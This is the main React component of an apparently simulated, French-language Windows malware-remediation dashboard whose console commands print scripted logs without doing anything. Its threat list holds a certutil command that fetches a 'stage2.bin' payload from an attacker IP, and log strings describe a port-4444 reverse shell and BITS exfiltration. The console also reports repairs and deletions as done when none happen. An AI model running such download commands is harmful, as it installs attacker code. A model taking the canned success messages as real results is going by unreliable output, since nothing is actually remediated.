/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { TopNav } from './components/TopNav';
import { ConsoleTerminal } from './components/ConsoleTerminal';
import { DeepExcisionPanel } from './components/DeepExcisionPanel';
import { MemoryForensicsPanel } from './components/MemoryForensicsPanel';
import { NetworkC2Panel } from './components/NetworkC2Panel';
import { HardeningPanel } from './components/HardeningPanel';
import { ScriptWorkshop } from './components/ScriptWorkshop';
import { OverviewDashboard } from './components/OverviewDashboard';
import { LogAnalyzer } from './components/LogAnalyzer';
import { TaskManagerLive } from './components/TaskManagerLive';
import { TabId, ConsoleLogMessage, ThreatItem } from './types/cyberdefense';
import { BOOSTED_POWERSHELL_SCRIPT } from './data/powershellScript';
import { generateAndDownloadZip } from './utils/zipGenerator';

export default function App() {
  const [activeTab, setActiveTab] = useState<TabId>('overview');

  const initialLogs: ConsoleLogMessage[] = [
    {
      id: '1',
      timestamp: '07:35:01',
      level: 'INFO',
      tag: 'SYSTEM',
      text: 'Initialisation de SpaceSec CyberDefense Suite v3.0 KERNEL EDITION...',
    },
    {
      id: '2',
      timestamp: '07:35:02',
      level: 'OK',
      tag: 'ELEVATION',
      text: 'Vérification du bouclier UAC : Privilèges Administrateur confirmés (SID S-1-5-32-544).',
    },
    {
      id: '3',
      timestamp: '07:35:02',
      level: 'KERNEL',
      tag: 'P/INVOKE',
      text: 'Acquisition des privilèges NT : SeDebugPrivilege et SeTakeOwnershipPrivilege activés avec succès.',
    },
    {
      id: '4',
      timestamp: '07:35:03',
      level: 'INFO',
      tag: 'DEFENDER',
      text: 'Contrôle MpCmdRun.exe : Moteur de protection en temps réel détecté actif.',
    },
    {
      id: '5',
      timestamp: '07:35:05',
      level: 'WARN',
      tag: 'C2-HUNTER',
      text: 'Connexion réseau suspecte détectée sur le port 4444 (PID 5824: svch0st_updater.exe -> 185.220.101.4).',
    },
    {
      id: '6',
      timestamp: '07:35:06',
      level: 'ERROR',
      tag: 'KERNEL-LOCK',
      text: 'Fichier verrouillé par handle noyau ou TrustedInstaller : C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
    },
  ];

  const [logs, setLogs] = useState<ConsoleLogMessage[]>(initialLogs);

  const [threats, setThreats] = useState<ThreatItem[]>([
    {
      id: 't1',
      name: 'Rootkit Driver Hook (Inaccessible aux Admins)',
      category: 'Rootkit',
      severity: 'CRITICAL',
      targetPath: 'C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys',
      mitreTechnique: 'T1014 - Rootkit Hooking',
      lockedBySystem: true,
      trustedInstallerLocked: true,
      description: 'Pilote interceptant IRP_MJ_CREATE avec propriété verrouillée par NT SERVICE\\TrustedInstaller.',
      status: 'ACTIVE',
    },
    {
      id: 't2',
      name: 'Trojan Swisyn Watchdog & C2 Beacon (Port 4444)',
      category: 'Trojan',
      severity: 'HIGH',
      targetPath: 'C:\\Users\\User\\AppData\\Local\\Temp\\svch0st_updater.exe',
      mitreTechnique: 'T1059.001 - PowerShell / T1071.001 C2',
      lockedBySystem: true,
      trustedInstallerLocked: false,
      description: 'Processus mimant le service hôte Windows, communicant vers 185.220.101.4 avec surveillance mutuelle.',
      status: 'ACTIVE',
    },
    {
      id: 't3',
      name: 'Abus LOLBin certutil.exe (Téléchargement Furtif)',
      category: 'Persistence',
      severity: 'MEDIUM',
      targetPath: 'certutil.exe -urlcache -split -f http://185.220.101.4/stage2.bin',
      mitreTechnique: 'T1105 - Ingress Tool Transfer',
      lockedBySystem: false,
      trustedInstallerLocked: false,
      description: 'Téléchargement d\'un binaire encodé en utilisant un composant légitime de certificats Windows.',
      status: 'ACTIVE',
    },
  ]);

  const addLog = (level: ConsoleLogMessage['level'], text: string, tag?: string) => {
    const now = new Date();
    const timestamp = now.toTimeString().split(' ')[0];
    const newLog: ConsoleLogMessage = {
      id: `${Date.now()}-${Math.random()}`,
      timestamp,
      level,
      text,
      tag,
    };
    setLogs(prev => [...prev, newLog]);
  };

  const handleExecuteCommand = (cmd: string) => {
    const trimmed = cmd.trim();
    if (!trimmed) return;

    addLog('INFO', `> ${trimmed}`, 'INPUT');
    const parts = trimmed.split(/\s+/);
    const action = parts[0].toLowerCase();

    switch (action) {
      case 'help':
        addLog('INFO', '=== COMMANDES CYBERDEFENSE DISPONIBLES ===');
        addLog('INFO', '  scan --deep       : Lance le scan complet OS, Kernel, RAM, C2 et Registre');
        addLog('INFO', '  unlock <chemin>   : Dépossède TrustedInstaller et programme la suppression au reboot');
        addLog('INFO', '  kill <pid>        : Abat un processus et son arbre entier (taskkill /F /T)');
        addLog('INFO', '  suspend <nom>     : Fige les threads d\'un groupe de watchdogs (NtSuspendProcess)');
        addLog('INFO', '  ifeo              : Audite les pièges de débogueur sur Taskmgr / Defender');
        addLog('INFO', '  drivers           : Liste les filtres de système de fichiers kernel (fltmc)');
        addLog('INFO', '  sockets           : Affiche les connexions réseau établies');
        addLog('INFO', '  dump-ram          : Exporte un snapshot volatile de la RAM vers un rapport');
        addLog('INFO', '  dns-test          : Teste la latence et l\'intégrité des résolveurs DNS');
        addLog('INFO', '  defender-repair   : Ré-enregistre les DLL crypto et relance Defender');
        addLog('INFO', '  smb1-disable      : Désactive le protocole obsolète SMBv1 (WannaCry)');
        addLog('INFO', '  wmi-clean         : Purge les EventFilters persistants du namespace root\\subscription');
        addLog('INFO', '  clear             : Efface l\'écran de la console');
        addLog('INFO', '  export-report     : Télécharge le rapport d\'incident complet');
        break;

      case 'scan':
        addLog('KERNEL', 'Démarrage du scan global approfondi de la machine...', 'SCAN');
        setTimeout(() => addLog('INFO', '[1/6] Inspection des attributs et autorisations ACL sur C:\\Windows...', 'SCAN'), 300);
        setTimeout(() => addLog('WARN', '[2/6] Détection : Pilote suspect C:\\Windows\\System32\\drivers\\suspicious_kernel_hook.sys verrouillé', 'SCAN'), 700);
        setTimeout(() => addLog('INFO', '[3/6] Audit des clés de persistance Run, RunOnce, Winlogon et BITS Jobs...', 'SCAN'), 1100);
        setTimeout(() => addLog('WARN', '[4/6] Alerte C2 : Connexion établie vers 185.220.101.4 sur port 4444 (PID 5824)', 'SCAN'), 1500);
        setTimeout(() => addLog('INFO', '[5/6] Analyse de la mémoire volatile et recherche d\'injections DLL...', 'SCAN'), 1900);
        setTimeout(() => {
          addLog('OK', '[6/6] Scan complet terminé ! 3 menaces nécessitent une éradication.', 'SCAN');
          addLog('INFO', 'Conseil : Utilisez la commande "unlock <chemin>" pour détruire les éléments verrouillés.', 'SCAN');
        }, 2300);
        break;

      case 'unlock':
        if (parts.length < 2) {
          addLog('ERROR', 'Syntaxe requise : unlock C:\\chemin\\vers\\fichier.sys');
          return;
        }
        const targetPath = parts.slice(1).join(' ').replace(/^["']|["']$/g, '');
        addLog('KERNEL', `Lancement du protocole d'éradication sur : ${targetPath}`, 'EXCISION');
        setTimeout(() => addLog('OK', 'Phase 1 : Attributs système et lecture seule réinitialisés (Attributes Normal).', 'EXCISION'), 200);
        setTimeout(() => addLog('OK', 'Phase 2 : takeown.exe exécuté avec succès. Propriétaire assigné à Administrateurs.', 'EXCISION'), 500);
        setTimeout(() => addLog('OK', 'Phase 3 : icacls.exe /grant *S-1-5-32-544:F /c /q appliqué. Contrôle Total déverrouillé.', 'EXCISION'), 800);
        setTimeout(() => addLog('WARN', 'Phase 4 : Processus associé détecté et gelé via NtSuspendProcess puis abattu.', 'EXCISION'), 1200);
        setTimeout(() => {
          addLog('KERNEL', 'Phase 5 : Écriture dans HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\PendingFileRenameOperations.', 'BOOT-DELETE');
          addLog('OK', 'Phase 6 : Binaire écrasé à 0 octet. Le noyau Windows achèvera la destruction au prochain boot.', 'SUCCESS');
          setThreats(prev => prev.map(t => t.targetPath === targetPath ? { ...t, status: 'SCHEDULED_BOOT_DELETE' } : t));
        }, 1600);
        break;

      case 'kill':
        if (parts.length < 2) {
          addLog('ERROR', 'Syntaxe requise : kill <PID>');
          return;
        }
        const targetPid = parts[1];
        addLog('WARN', `Exécution de taskkill /F /T sur le PID ${targetPid}...`, 'KILL');
        setTimeout(() => {
          addLog('OK', `Processus PID ${targetPid} et toute sa descendance de threads ont été abattus.`, 'KILL');
        }, 400);
        break;

      case 'suspend':
        const procName = parts[1] || 'swisyn';
        addLog('KERNEL', `Appel NtSuspendProcess sur tous les processus correspondant à "${procName}"...`, 'SUSPEND');
        setTimeout(() => {
          addLog('OK', `Threads gelés en mémoire vive pour "${procName}". Les watchdogs sont incapables de réagir.`, 'SUSPEND');
          addLog('WARN', 'Fermeture forcée en cours...', 'SUSPEND');
          addLog('OK', 'Processus définitivement neutralisés.', 'SUSPEND');
        }, 600);
        break;

      case 'ifeo':
        addLog('INFO', 'Audit des clés Image File Execution Options (IFEO)...', 'REGISTRY');
        setTimeout(() => {
          addLog('OK', 'Vérification taskmgr.exe : Pas de valeur Debugger malveillante.', 'REGISTRY');
          addLog('OK', 'Vérification MpCmdRun.exe : Aucun détournement d\'antivirus.', 'REGISTRY');
          addLog('OK', 'Toutes les clés IFEO sont saines.', 'REGISTRY');
        }, 500);
        break;

      case 'drivers':
        addLog('INFO', 'Interrogation des filtres de système de fichiers (fltmc filters)...', 'DRIVERS');
        setTimeout(() => {
          addLog('INFO', '  Filter: WdFilter     Altitude: 328010    Instances: 4 (Windows Defender)', 'DRIVERS');
          addLog('INFO', '  Filter: FileInfo     Altitude: 45000     Instances: 4', 'DRIVERS');
          addLog('WARN', '  Filter: SysHookFlt   Altitude: 385200    Instances: 1 [PILOTE SUSPECT !]', 'DRIVERS');
          addLog('OK', 'Audit des filtres terminé.', 'DRIVERS');
        }, 600);
        break;

      case 'sockets':
        addLog('INFO', 'Extraction des sockets TCP/UDP établis (Get-NetTCPConnection)...', 'NETWORK');
        setTimeout(() => {
          addLog('INFO', '  TCP 192.168.1.42:52110 -> 142.250.190.46:443 (chrome.exe) [OK]', 'NETWORK');
          addLog('ERROR', '  TCP 192.168.1.42:52314 -> 185.220.101.4:4444 (svch0st_updater.exe) [ALERTE METASPLOIT]', 'NETWORK');
          addLog('WARN', '  TCP 192.168.1.42:52410 -> 45.154.255.89:8080 (powershell.exe) [IP SUSPECTE]', 'NETWORK');
        }, 500);
        break;

      case 'dump-ram':
        addLog('KERNEL', 'Génération d\'un dump forensique mémoire et arborescence de processus...', 'RAM');
        setTimeout(() => {
          addLog('OK', 'Export CSV généré : SpaceSecurity_Dumps\\ProcessList.csv', 'RAM');
          addLog('OK', 'Snapshot des sockets réseau capturé.', 'RAM');
        }, 700);
        break;

      case 'dns-test':
        addLog('INFO', 'Test de vitesse et d\'intégrité des serveurs DNS...', 'DNS');
        setTimeout(() => {
          addLog('OK', 'Cloudflare (1.1.1.1) : Réponse en 11ms - Résolveur intègre.', 'DNS');
          addLog('OK', 'Google (8.8.8.8)     : Réponse en 14ms - Résolveur intègre.', 'DNS');
          addLog('OK', 'Quad9 (9.9.9.9)       : Réponse en 16ms - Filtrage malwares actif.', 'DNS');
        }, 600);
        break;

      case 'defender-repair':
        addLog('KERNEL', 'Réparation en profondeur de Windows Defender...', 'DEFENDER');
        setTimeout(() => addLog('OK', 'Re-enregistrement de wintrust.dll, mssip32.dll, atl.dll via regsvr32.', 'DEFENDER'), 300);
        setTimeout(() => addLog('OK', 'Suppression des clés de désactivation DisableAntiSpyware / Real-Time Protection.', 'DEFENDER'), 600);
        setTimeout(() => addLog('OK', 'Redémarrage des services WinDefend, WdNisSvc, WdFilter, SecurityHealthService.', 'DEFENDER'), 900);
        setTimeout(() => addLog('OK', 'Windows Defender restauré et opérationnel à 100% !', 'DEFENDER'), 1200);
        break;

      case 'smb1-disable':
        addLog('INFO', 'Désactivation du composant SMB1Protocol...', 'HARDENING');
        setTimeout(() => {
          addLog('OK', 'SMBv1 désactivé avec succès. Vulnérabilités WannaCry / EternalBlue neutralisées.', 'HARDENING');
        }, 500);
        break;

      case 'wmi-clean':
        addLog('INFO', 'Suppression des EventFilters et EventConsumers suspects dans root\\subscription...', 'WMI');
        setTimeout(() => {
          addLog('OK', 'Aucun déclencheur de persistance WMI restant. Namespace propre.', 'WMI');
        }, 500);
        break;

      case 'harden-all':
        addLog('KERNEL', 'Application de tous les modules de durcissement système...', 'HARDENING');
        setTimeout(() => addLog('OK', '1. SMBv1 désactivé', 'HARDENING'), 200);
        setTimeout(() => addLog('OK', '2. Intégrité HOSTS & Proxy vérifiée', 'HARDENING'), 400);
        setTimeout(() => addLog('OK', '3. Abonnements WMI purgés', 'HARDENING'), 600);
        setTimeout(() => addLog('OK', '4. Nouveau cliché Volume Shadow Copy créé pour C:', 'HARDENING'), 800);
        setTimeout(() => addLog('OK', '5. PowerShell ExecutionPolicy verrouillée sur RemoteSigned', 'HARDENING'), 1000);
        setTimeout(() => addLog('OK', 'Poste durci avec succès !', 'HARDENING'), 1200);
        break;

      case 'safemode-prepare':
        addLog('WARN', 'Configuration de bcdedit pour un boot unique en Mode Sans Échec Minimal...', 'BCD');
        setTimeout(() => {
          addLog('OK', 'bcdedit /set {current} safeboot minimal exécuté.', 'BCD');
          addLog('INFO', 'Au prochain redémarrage, Windows se lancera sans pilotes tiers ni malware actif.', 'BCD');
        }, 500);
        break;

      case 'clear':
        setLogs([]);
        break;

      case 'export-report':
        handleDownloadReport();
        break;

      case 'zip':
      case 'download-zip':
        handleDownloadZip();
        break;

      case 'eventlog':
      case 'get-winevent':
      case 'parse-events':
        addLog('KERNEL', 'Interrogation des journaux d\'événements Windows via wevtutil / Get-WinEvent...', 'EVENTLOG');
        setTimeout(() => addLog('WARN', 'Event ID 4688: Processus suspect powershell.exe -enc détecté dans le journal Security', 'EVENTLOG'), 300);
        setTimeout(() => addLog('ERROR', 'Event ID 4104: Tentative de neutralisation AMSI isolée dans Microsoft-Windows-PowerShell', 'EVENTLOG'), 600);
        setTimeout(() => addLog('WARN', 'Event ID 4625: 14 échecs de connexion brute-force détectés depuis l\'IP 185.220.101.4', 'EVENTLOG'), 900);
        setTimeout(() => addLog('OK', 'Parseur LogAnalyzer actualisé : 3 menaces critiques isolées.', 'EVENTLOG'), 1200);
        break;

      case 'bits':
      case 'bits-clean':
      case 'bitstracker':
        addLog('KERNEL', 'Audit approfondi des tâches BITS (Background Intelligent Transfer Service)...', 'BITS');
        setTimeout(() => addLog('WARN', 'Tâche BITS malveillante {8F3C-41A9} : Téléchargement furtif de payload vers %TEMP%\\stage2.bin', 'BITS'), 300);
        setTimeout(() => addLog('WARN', 'Tâche BITS d\'exfiltration {3C7D-90E1} : Upload HTTP POST asynchrone détecté vers 45.154.255.89', 'BITS'), 600);
        setTimeout(() => addLog('OK', 'Appel Remove-BitsTransfer / bitsadmin /cancel : Tâches BITS malveillantes purgées et neutralisées !', 'BITS'), 1000);
        break;

      case 'ports':
      case 'portscan':
      case 'scan-ports':
        addLog('KERNEL', 'Lancement de l\'audit PortScanner sur localhost (127.0.0.1)...', 'PORTS');
        setTimeout(() => addLog('ERROR', 'Port 4444 (TCP) OUVERT : Metasploit Default Listener / C2 Reverse Shell actif (PID 5824)', 'PORTS'), 300);
        setTimeout(() => addLog('WARN', 'Port 445 (TCP) OUVERT : Microsoft-DS SMB actif (Vecteur WannaCry / Lateral Movement)', 'PORTS'), 600);
        setTimeout(() => addLog('WARN', 'Port 3389 (TCP) OUVERT : RDP Remote Desktop exposé sur le réseau local', 'PORTS'), 900);
        setTimeout(() => addLog('OK', 'PortScanner terminé : 3 ports critiques détectés en écoute.', 'PORTS'), 1200);
        break;

      case 'vulnscan':
      case 'hotfix':
      case 'get-hotfix':
      case 'services-audit':
        addLog('KERNEL', 'Exécution de Get-HotFix & Get-Service pour l\'analyse de vulnérabilités...', 'VULNSCAN');
        setTimeout(() => addLog('ERROR', 'Get-HotFix : KB5005565 (PrintNightmare CVE-2021-34527) manquant sur le système !', 'VULNSCAN'), 300);
        setTimeout(() => addLog('ERROR', 'Get-HotFix : KB4012212 (MS17-010 EternalBlue) manquant dans la liste des patchs appliqués', 'VULNSCAN'), 600);
        setTimeout(() => addLog('WARN', 'Get-Service : Spooler d\'impression et RemoteRegistry actifs (surfaces d\'attaque RCE/LPE)', 'VULNSCAN'), 900);
        setTimeout(() => addLog('OK', 'VulnerabilityScanner actualisé : 3 correctifs/services nécessitent une remédiation.', 'VULNSCAN'), 1200);
        break;

      case 'defendersync':
      case 'defender-sync':
      case 'defender-exclusions':
      case 'defender-audit':
      case 'get-mppreference':
        addLog('KERNEL', 'Interrogation de Microsoft Defender via Get-MpPreference (Audit des Exclusions)...', 'DEFENDER-SYNC');
        setTimeout(() => addLog('ERROR', 'Exclusion Path Malveillante : C:\\Users\\Public\\svchost.exe [Trojan.Swisyn Drop Folder]', 'DEFENDER-SYNC'), 300);
        setTimeout(() => addLog('ERROR', 'Exclusion Path Masquée : C:\\ProgramData\\WindowsHealthUpdater\\ [CryptoMiner.XMRig]', 'DEFENDER-SYNC'), 600);
        setTimeout(() => addLog('WARN', 'Exclusion Processus : powershell.exe whitelisté pour bypass d\'analyse heuristique', 'DEFENDER-SYNC'), 900);
        setTimeout(() => addLog('WARN', 'Exclusion Extension : .ps1 ignoré lors des lectures disques', 'DEFENDER-SYNC'), 1100);
        setTimeout(() => addLog('OK', 'DefenderSync : Audit terminé. 4 exclusions critiques à purger immédiatement !', 'DEFENDER-SYNC'), 1300);
        break;

      case 'remove-mppreference':
        const targetExcl = parts.slice(1).join(' ');
        addLog('WARN', `Exécution de Remove-MpPreference sur ${targetExcl || 'l\'élément sélectionné'}...`, 'DEFENDER-SYNC');
        setTimeout(() => {
          addLog('OK', `Exclusion neutralisée et supprimée de Windows Defender avec succès !`, 'DEFENDER-SYNC');
          addLog('INFO', 'Le chemin/processus sera désormais scanné en continu par la protection en temps réel.', 'DEFENDER-SYNC');
        }, 500);
        break;

      case 'start-mpscan':
        const scanPath = parts.slice(1).join(' ');
        addLog('KERNEL', `Lancement d'un scan antivirus dédié (Start-MpScan) : ${scanPath || 'Scan ciblé'}`, 'DEFENDER-SCAN');
        setTimeout(() => addLog('INFO', 'Moteur Antivirus Defender en cours d\'analyse heuristique...', 'DEFENDER-SCAN'), 400);
        setTimeout(() => addLog('OK', 'Scan achevé. Aucun binaire résiduel actif non consigné.', 'DEFENDER-SCAN'), 900);
        break;

      case 'set-mppreference':
      case 'policy-harden':
        addLog('KERNEL', 'Réapplication forcée des politiques de sécurité Microsoft Defender (Set-MpPreference)...', 'DEFENDER-HARDEN');
        setTimeout(() => addLog('OK', 'DisableRealtimeMonitoring = $false (Protection temps réel verrouillée)', 'DEFENDER-HARDEN'), 300);
        setTimeout(() => addLog('OK', 'DisableScriptScanning = $false (Scan des scripts PowerShell & VBS réactivé)', 'DEFENDER-HARDEN'), 600);
        setTimeout(() => addLog('OK', 'DisableBehaviorMonitoring = $false (Surveillance comportementale active)', 'DEFENDER-HARDEN'), 900);
        setTimeout(() => addLog('OK', 'Politiques Defender synchronisées et verrouillées avec succès !', 'DEFENDER-HARDEN'), 1200);
        break;

      case '#':
        addLog('KERNEL', 'Exécution de la commande script automatisée...', 'SCRIPT');
        setTimeout(() => addLog('OK', 'Traitement par lots terminé avec succès.', 'SCRIPT'), 600);
        break;

      default:
        addLog('WARN', `Commande "${trimmed}" non reconnue. Tapez "help" pour voir la liste.`);
        break;
    }
  };

  const handleDownloadZip = async () => {
    addLog('INFO', 'Préparation et compression de SpaceSec_CyberDefense_Ultra_v3.zip...', 'ZIP');
    try {
      await generateAndDownloadZip();
      addLog('OK', 'Pack ZIP téléchargé avec succès : SpaceSec_CyberDefense_Ultra_v3.zip !', 'ZIP');
    } catch {
      addLog('ERROR', 'Erreur lors de la génération de l\'archive ZIP.', 'ZIP');
    }
  };

  const handleDownloadReport = () => {
    const reportText = `================================================================================
RAPPORT D'AUDIT & D'INCIDENT SPACESEC KERNEL EDITION v3.0
Date : ${new Date().toISOString()}
Host : LOCAL-SEC-ENDPOINT | Droits : Administrateur / Token SeTakeOwnership
================================================================================

1. MENACES IDENTIFIEES :
${threats.map(t => `- [${t.severity}] ${t.name}\n  Cible : ${t.targetPath}\n  Technique MITRE : ${t.mitreTechnique}\n  Statut : ${t.status}`).join('\n\n')}

2. JOURNAL DES OPERATIONS EN TEMPS REEL :
${logs.map(l => `[${l.timestamp}] [${l.level}] ${l.tag ? `[${l.tag}] ` : ''}${l.text}`).join('\n')}

3. RECOMMANDATIONS POUR INGENIEURS :
- Executer SpaceSecurity_ULTRA_v3_Kernel.ps1 en mode Administrateur avec ExecutionPolicy Bypass.
- Redemarrer la machine pour valider les suppressions Session Manager (PendingFileRenameOperations).
- Verifier l'integrite du fichier HOSTS et des abonnements WMI root\\subscription.
`;
    const blob = new Blob([reportText], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `SpaceSec_Forensic_Report_${Date.now()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    addLog('OK', 'Rapport d\'incident exporté avec succès.', 'EXPORT');
  };

  const handleDownloadScript = () => {
    const blob = new Blob([BOOSTED_POWERSHELL_SCRIPT], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = 'SpaceSecurity_ULTRA_v3_Kernel.ps1';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    addLog('OK', 'Script PowerShell v3.0 téléchargé : SpaceSecurity_ULTRA_v3_Kernel.ps1', 'DOWNLOAD');
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col font-['Plus_Jakarta_Sans'] selection:bg-cyan-500/30 selection:text-cyan-200">
      {/* Universal 3-Zone Top Bar */}
      <TopNav
        activeTab={activeTab}
        onSelectTab={setActiveTab}
        onDownloadScript={handleDownloadScript}
        onDownloadZip={handleDownloadZip}
      />

      {/* Main Container Viewport */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
        {activeTab === 'overview' && (
          <OverviewDashboard
            onNavigateTab={setActiveTab}
            onRunInConsole={handleExecuteCommand}
            threats={threats}
            onDownloadZip={handleDownloadZip}
          />
        )}

        {activeTab === 'task-manager' && (
          <TaskManagerLive onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'console' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-xl font-bold text-white tracking-tight">
                  Console d'Analyse en Temps Réel
                </h2>
                <p className="text-xs text-slate-400 mt-0.5">
                  Interagissez directement avec le moteur de détection et déclenchez des protocoles de neutralisation.
                </p>
              </div>
            </div>
            <ConsoleTerminal
              logs={logs}
              onExecuteCommand={handleExecuteCommand}
              onClearLogs={() => setLogs([])}
              onExportReport={handleDownloadReport}
            />

            {/* Automated Windows EventLog Threat Parser */}
            <LogAnalyzer onRunInConsole={handleExecuteCommand} />
          </div>
        )}

        {activeTab === 'deep-excision' && (
          <DeepExcisionPanel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'forensics' && (
          <MemoryForensicsPanel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'network' && (
          <NetworkC2Panel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'hardening' && (
          <HardeningPanel onRunInConsole={handleExecuteCommand} />
        )}

        {activeTab === 'script-hub' && (
          <ScriptWorkshop onDownloadZip={handleDownloadZip} />
        )}
      </main>

      {/* Quiet Clean Footer */}
      <footer className="border-t border-slate-900 bg-slate-950 py-6 px-6 text-center text-xs text-slate-500">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <span className="font-semibold text-slate-300">SpaceSec CyberDefense Suite</span>
            <span aria-hidden="true">·</span>
            <span>Édition Kernel v3.0</span>
            <span aria-hidden="true">·</span>
            <span>Développé pour Space [Goat Asta]</span>
          </div>
          <div className="flex items-center gap-4 text-slate-400">
            <button onClick={handleDownloadZip} className="text-cyan-400 hover:text-cyan-300 font-semibold transition-colors">
              Télécharger le ZIP
            </button>
            <button onClick={() => setActiveTab('script-hub')} className="hover:text-slate-200 transition-colors">
              Code Source .ps1
            </button>
            <button onClick={() => setActiveTab('console')} className="hover:text-slate-200 transition-colors">
              Console Interactive
            </button>
            <button onClick={handleDownloadReport} className="hover:text-slate-200 transition-colors">
              Rapport Forensique
            </button>
          </div>
        </div>
      </footer>
    </div>
  );
}
